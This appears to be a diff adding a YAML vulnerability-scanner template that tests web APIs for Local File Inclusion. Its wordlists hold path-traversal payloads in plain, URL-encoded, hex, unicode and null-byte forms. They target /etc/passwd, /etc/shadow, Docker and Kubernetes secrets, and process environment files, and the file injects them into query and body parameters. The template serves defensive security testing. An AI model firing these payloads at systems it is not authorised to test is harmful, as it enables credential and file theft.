@@ -1,0 +1,218 @@
+id: SMART_LFI_IN_PARAMETER
+info:
+  name: LFI in Parameter - Smart Testing
+  description: Smart testing for Local File Inclusion vulnerabilities. Detects when applications fail to properly validate file path inputs in parameters, headers, and URL paths, allowing unauthorized file access.
+  details: Tests for Local File Inclusion by intelligently fuzzing file path parameters with various traversal techniques, encoding methods, and null byte injections. The system detects vulnerabilities across different parameter locations (query, body, headers, path) and encoding variations.
+  impact: Unauthorized file access, sensitive data disclosure, server configuration exposure, credential theft, code execution, and complete system compromise.
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: SMART_LFI_IN_PARAMETER
+  severity: HIGH
+  agenticTestingAllowed: true
+  onlySmartTestingAllowed: true
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+    - https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2022-29597
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  or:
+    - request_payload:
+        for_one:
+          value:
+            regex: ^.*\..{1,4}$
+          key:
+            extract: file_path
+    - query_param:
+        for_one:
+          value:
+            regex: ^.*\..{1,4}$
+          key:
+            extract: file_path
+    - url:
+        extract: urlVar
+
+wordLists:
+  basicTraversal:
+    - "/etc/passwd"
+    - "/etc/npasswd"
+    - "../etc/passwd"
+    - "../../etc/passwd"
+    - "../../../etc/passwd"
+    - "../../../../etc/passwd"
+    - "../../../../../etc/passwd"
+    - "../../../../../../etc/passwd"
+  doubleSlashTraversal:
+    - "..//etc/passwd"
+    - "../..///etc/passwd"
+    - "../../..///etc/passwd"
+    - "../../../..///etc/passwd"
+    - "../../../../..///etc/passwd"
+    - "../../../../../..///etc/passwd"
+  urlEncodedTraversal:
+    - "..%2f/etc/passwd"
+    - "..%2f..%2f/etc/passwd"
+    - "..%2f..%2f..%2f/etc/passwd"
+    - "..%2f..%2f..%2f..%2f/etc/passwd"
+    - "..%2f..%2f..%2f..%2f..%2f/etc/passwd"
+    - "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
+  backslashTraversal:
+    - "..\\etc/passwd"
+    - "..\\..\\etc/passwd"
+    - "..\\..\\..\\etc/passwd"
+    - "..\\..\\..\\..\\etc/passwd"
+  doubleUrlEncodedTraversal:
+    - "..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers"
+    - "..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config"
+  hexEncodedTraversal:
+    - "0x2e0x2e//etc/passwd"
+    - "0x2e0x2e/0x2e0x2e//etc/passwd"
+    - "..0x2f/etc/passwd"
+    - "..0x2f..0x2f/etc/passwd"
+    - "..0x2f..0x2f..0x2f/etc/passwd"
+  unicodeTraversal:
+    - "..%c0%afdocker.sock"
+  nullByteTraversal:
+    - "../../../../../../../../../../../../etc/passwd%00"
+    - "../../../../../../../../../../../../etc/shadow%00"
+    - "../../../../../../../../../../../../root/.bash_history%00"
+  dockerFiles:
+    - "/var/lib/docker/containers"
+    - "/var/lib/docker/containers/*/config.v2.json"
+    - "/var/lib/docker/containers/*/hostconfig.json"
+    - "/root/.docker/config.json"
+    - "/var/run/docker.sock"
+  kubernetesFiles:
+    - "/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token"
+    - "/etc/kubernetes/admin.conf"
+    - "/root/.kube/config"
+  systemFiles:
+    - "/proc/self/environ"
+    - "/proc/self/cmdline"
+    - "/sys/class/net/eth0/address"
+    - "/etc/resolv.conf"
+  logFiles:
+    - "/var/log/docker.log"
+    - "/var/log/kube-apiserver.log"
+
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_query_param:
+            file_path: ${basicTraversal}
+        - modify_body_param:
+            file_path: ${basicTraversal}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "root:x:0:0:"
+                - "daemon:x:"
+                - "/bin/bash"
+                - "/usr/sbin/nologin"
+        - success: x1
+        - failure: continue
+    - req:
+        - modify_query_param:
+            file_path: ${doubleSlashTraversal}
+        - modify_body_param:
+            file_path: ${doubleSlashTraversal}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "root:x:0:0:"
+                - "daemon:x:"
+        - success: x2
+        - failure: continue
+    - req:
+        - modify_query_param:
+            file_path: ${urlEncodedTraversal}
+        - modify_body_param:
+            file_path: ${urlEncodedTraversal}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - "root:x:0:0:"
+                - "daemon:x:"
+        - success: x3
+        - failure: continue
+    - req:
+        - modify_query_param:
+            file_path: ${dockerFiles}
+        - modify_body_param:
+            file_path: ${dockerFiles}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+        - success: x4
+        - failure: continue
+    - req:
+        - modify_query_param:
+            file_path: ${kubernetesFiles}
+        - modify_body_param:
+            file_path: ${kubernetesFiles}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+        - success: x5
+        - failure: continue
+    - req:
+        - modify_query_param:
+            file_path: ${nullByteTraversal}
+        - modify_body_param:
+            file_path: ${nullByteTraversal}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+        - success: vulnerable
+
